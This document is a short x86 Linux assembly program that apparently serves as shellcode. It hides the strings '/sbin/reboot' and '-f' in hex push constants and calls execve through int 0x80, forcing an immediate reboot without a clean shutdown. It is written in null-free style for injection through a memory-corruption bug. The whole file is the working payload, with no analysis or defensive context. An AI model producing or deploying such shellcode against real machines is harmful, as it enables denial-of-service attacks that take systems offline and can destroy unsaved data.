global _start

section .text
	
;use this as the program entry point
_start:
	xor eax,eax
	push eax
	push dword 0x746f6f62
	push dword 0x65722f6e
	push dword 0x6962732f
	mov ebx,esp
	push eax
	push word 0x662d
	mov esi,esp
	push eax
	push esi
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80

